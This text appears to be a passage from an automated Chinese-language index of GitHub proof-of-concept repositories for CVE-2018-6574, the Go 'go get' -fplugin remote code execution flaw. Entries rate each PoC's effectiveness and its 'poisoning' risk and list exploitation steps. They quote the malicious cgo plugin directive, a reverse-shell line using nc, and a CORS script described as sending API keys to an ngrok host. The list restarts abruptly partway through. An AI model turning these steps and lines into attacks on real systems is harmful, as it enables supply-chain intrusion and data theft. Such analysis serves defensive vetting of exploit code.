6.  当 `go get` 构建项目时，会调用 GCC 并加载 `attack.so` 插件，导致 `malicious()` 函数执行，从而执行攻击者预设的任意命令。

**有效性：**

提供的 POC 代码有效，可以复现该漏洞。

**投毒风险：**

根据提供的代码，没有发现作者隐藏的投毒代码。`attack.c` 中明确包含恶意代码，是漏洞利用的一部分，不应将其视为投毒代码。 因此，投毒风险为 0%。

**搜索引擎结果印证：**

搜索结果中，[webpage 4] 链接指向 pentesterlab 的练习，明确指出该漏洞允许攻击者通过欺骗用户安装恶意包来执行任意代码。其他的搜索结果也都表明了该漏洞的严重性。

**项目地址:** [paulogmota/CVE-2018-6574](https://github.com/paulogmota/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #27

**来源**: [CVE-2018-6574-rootxjs_CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令获取恶意Go包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以创建一个恶意的 Go 包，其中包含利用 gcc 或 clang 插件功能的恶意代码。当用户使用 `go get` 获取并构建此恶意包时，Go 会执行攻击者插入的恶意代码。

**有效性：**
提供的 POC 代码演示了如何利用 `-fplugin` 选项。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 在编译时加载 `attack.so` 插件。如果 `attack.so` 包含恶意代码，它将在构建过程中执行。这个POC代码表明该漏洞可以被利用。

**投毒风险：**
代码中通过 `-fplugin=./attack.so` 引入外部so文件，如果该so文件不是由代码作者提供或来源不明，则存在投毒风险。虽然POC本身只是一个演示性质的例子，但是一旦被攻击者利用，替换`attack.so`，可能会导致用户在不知情的情况下运行恶意代码。投毒风险估计为10%，因为需要攻击者替换或控制`attack.so`文件。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.so` 文件的 Go 包。`attack.so` 文件包含攻击者想要执行的任意代码。
2.  攻击者将包含恶意 Go 包的仓库托管在公共服务器上。
3.  攻击者诱使用户使用 `go get` 命令获取此恶意包，例如 `go get github.com/attacker/evilpackage`。
4.  当用户运行 `go get` 命令时，Go 会下载并构建该包。由于 `main.go` 中包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令，构建过程会加载并执行 `attack.so` 中的恶意代码。
5.  恶意代码在用户系统上执行，攻击者可以获得远程代码执行权限。

**项目地址:** [rootxjs/CVE-2018-6574](https://github.com/rootxjs/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #28

**来源**: [CVE-2018-6574-rootxjs_new-CVE-2018-6574.md](../2018/CVE-2018-6574-rootxjs_new-CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 需要目标机器运行受影响版本的 Go，并且使用 'go get' 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建源代码期间，通过 'go get' 命令执行远程命令。这是因为受影响版本的 Go 没有阻止 `-fplugin=` 和 `-plugin=` 参数，这些参数可以被用来加载恶意的 gcc 或 clang 插件。提供的POC代码演示了如何利用此漏洞。它通过在 Go 代码中使用 `#cgo CFLAGS: -fplugin=./plugin.so` 指令来指定一个恶意的插件。当构建此代码时，go 会尝试加载 `./plugin.so`，这使得攻击者能够在目标机器上执行任意代码。根据POC代码内容分析，未发现作者隐藏的投毒代码。

**项目地址:** [rootxjs/new-CVE-2018-6574](https://github.com/rootxjs/new-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #29

**来源**: [CVE-2018-6574-seoqqq_CVE-2018-6574.md](../2018/CVE-2018-6574-seoqqq_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的 Go 版本执行 `go get` 命令从恶意仓库获取代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者利用 `go get` 命令在构建源代码时执行任意命令。该漏洞源于 Go 在处理 gcc 或 clang 插件选项时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以通过创建一个包含恶意代码的 Go 包，并在该包中利用 CGO 特性，将恶意的编译器选项注入到构建过程中。当用户使用受影响的 Go 版本执行 `go get` 命令来获取并构建该恶意包时，恶意代码将被执行。

**有效性分析：**
提供的 PoC 代码看起来是有效的。`main.go` 文件使用了 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，这正是漏洞利用的关键。这个指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件。`attack.c` 文件定义了一个 `exploit` 函数，该函数使用 `__attribute__((constructor))` 属性，确保在动态链接库加载时自动执行。因此，当 `go get` 命令构建包含 `main.go` 的包时，`attack.so` 会被加载，`exploit` 函数会被执行，从而实现任意命令执行。

**投毒风险分析：**
经过对提供的代码进行分析，没有发现明显的投毒代码。`aaa.c`、`attack.c` 和 `exploit.c` 都包含执行 `/usr/local/bin/score 4a0b3a0c-6593-4414-86ca-c78649e04c0f` 命令的代码或者执行`sleep 20`的代码。这些代码是PoC本身的一部分，旨在验证漏洞。`README.md`是对漏洞的描述说明，`main.go`是触发漏洞的主代码, 所以仓库中作者隐藏的投毒代码可能性为0%。

**利用方式总结：**
1.  **创建恶意 Go 包：** 攻击者创建一个包含 `main.go` 文件的 Go 包，并在 `main.go` 文件中使用 CGO 指令 `#cgo CFLAGS: -fplugin=./attack.so`，指向包含恶意代码的动态链接库。
2.  **创建恶意动态链接库：** 攻击者创建一个动态链接库（例如 `attack.so`），该库包含在加载时自动执行的恶意代码。
3.  **托管恶意包：** 攻击者将恶意 Go 包托管在一个可以通过 `go get` 命令访问的仓库中（例如 GitHub）。
4.  **诱导用户执行 `go get`：** 攻击者诱导用户使用受影响的 Go 版本执行 `go get <malicious_package_url>` 命令来获取并构建恶意包。
5.  **执行恶意代码：** 当用户执行 `go get` 命令时，Go 编译器会加载恶意动态链接库，并执行其中的恶意代码，从而实现远程命令执行。

**项目地址:** [seoqqq/CVE-2018-6574](https://github.com/seoqqq/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #30

**来源**: [CVE-2018-6574-solovvway_CVE-2018-6574.md](../2018/CVE-2018-6574-solovvway_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标系统需要使用受影响的Go版本，攻击者需要能够让目标系统通过`go get`获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在构建 Go 项目时执行任意代码。该漏洞源于 `go get` 命令在处理 gcc 或 clang 插件选项时没有正确过滤 `-fplugin` 和 `-plugin` 参数。攻击者可以通过构造包含恶意 `// #cgo CFLAGS: -fplugin=./attack.so` 的 Go 代码，诱使受害者使用 `go get` 命令下载并构建该项目。构建过程中，会加载攻击者提供的恶意插件（attack.so），从而执行任意代码。

漏洞利用方式：

1.  攻击者创建一个包含恶意代码的 Go 项目。
2.  项目中的 Go 文件包含 `// #cgo CFLAGS: -fplugin=./attack.so` 这样的注释，指定加载恶意的插件。
3.  攻击者将项目托管在公开的代码仓库中。
4.  受害者使用 `go get` 命令获取该项目。
5.  `go get` 在构建项目时，会加载并执行攻击者提供的恶意插件。

根据提供的代码，`attack.c` 文件中定义了一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 91e025d6-94e9-4d26-8b86-c00dea0b3129`。这个命令看起来像是用于提交漏洞利用得分的，本身不包含恶意或投毒行为。`main.go` 文件则通过 cgo 技术，将 attack.so 文件编译为插件,并通过 // #cgo CFLAGS指定。

有效性：提供的POC代码有效，能实现远程代码执行。
投毒风险：在给定的代码中，没有发现明显的投毒行为。`attack.c` 中的 system 命令只是执行了一个特定的脚本，用于提交得分，没有发现进一步利用或危害系统的代码。



**项目地址:** [solovvway/CVE-2018-6574](https://github.com/solovvway/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #31

**来源**: [CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md](../2018/CVE-2018-6574-the-valluvarsploit_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源码构建过程中利用 gcc 或 clang 插件特性执行远程命令。漏洞原因是 Go 在执行 `go get` 时没有正确阻止 `-fplugin=` 和 `-plugin=` 参数。 

**有效性:**

提供的 POC 代码有效。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 在程序启动时自动执行 `/usr/local/bin/score 5406e228-19be-4c56-b6da-ee36ce3dee1a` 命令。`main.go` 文件使用 `cgo` 调用 `attack.so` (由 `attack.c` 编译而来)，从而触发恶意代码执行。

**投毒风险:**

提供的代码中没有明显的投毒代码。`attack.c` 的功能很明确，就是执行一个固定的命令。`main.go` 只是为了触发 `attack.c` 中恶意函数的执行。因此，投毒风险评估为 0%。

**利用方式:**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 包含在程序启动时执行任意命令的代码。
3.  `main.go` 利用 `cgo` 技术，通过 `-fplugin=` 选项加载并执行 `attack.c` 编译后的共享库。
4.  攻击者将该恶意 Go 包托管在可访问的存储库中。
5.  受害者在易受攻击的 Go 版本上使用 `go get` 命令下载并构建该恶意包。
6.  构建过程中，`attack.so` 被加载，其中的恶意代码被执行，导致远程命令执行。
7.  `/usr/local/bin/score` 命令被执行，可能导致系统受损或被控制。

**项目地址:** [the-valluvarsploit/CVE-2018-6574](https://github.com/the-valluvarsploit/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #32

**来源**: [CVE-2018-6574-tjcim_cve-2018-6574.md](../2018/CVE-2018-6574-tjcim_cve-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本，并通过`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许在源代码构建期间执行远程命令。这是因为 Go 在处理 gcc 或 clang 插件功能时，未阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的 Go 包，该代码利用这些参数在构建时执行任意命令。提供的 POC 代码通过创建一个共享对象 (`attack.so`)，其中包含一个在加载时执行 `sleep 10` 命令的构造函数。`main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，在构建时加载该共享对象，从而触发恶意代码的执行。漏洞利用方式是诱使用户使用易受攻击的 Go 版本 `go get` 命令下载并构建包含恶意 `#cgo` 指令的包。由于POC代码明确定义了执行的命令和利用方式，没有发现隐藏的恶意代码，因此投毒风险评估为0%。

**项目地址:** [tjcim/cve-2018-6574](https://github.com/tjcim/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #33

**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

